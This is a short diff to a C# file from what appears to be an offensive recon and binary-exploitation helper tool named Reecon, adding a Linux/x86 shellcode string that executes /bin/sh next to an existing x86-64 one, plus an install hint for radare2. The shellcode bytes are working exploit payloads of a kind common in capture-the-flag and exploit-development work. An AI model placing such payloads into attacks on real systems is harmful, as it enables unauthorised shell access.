@@ -196,6 +196,10 @@ namespace Reecon
                     {
                         Console.WriteLine(@"Linux/x86-64 - Execute /bin/sh: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05");
                     }
+                    else if (architecture == Architecture.Linux86)
+                    {
+                        Console.WriteLine(@"Linux/x86 - Execute /bin/sh: \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80");
+                    }
                     else if (architecture == Architecture.Windows)
                     {
                         // -f c = Format (Else it just parses raw bytes instead of showing them)
@@ -227,7 +231,7 @@ namespace Reecon
             }
             else
             {
-                Console.WriteLine("- rabin2 is not installed - Skipping nx check");
+                Console.WriteLine("- rabin2 is not installed (sudo apt install radare2 or https://github.com/radareorg/radare2/releases) - Skipping nx check");
             }
 
             if (General.IsInstalledOnLinux("objdump"))
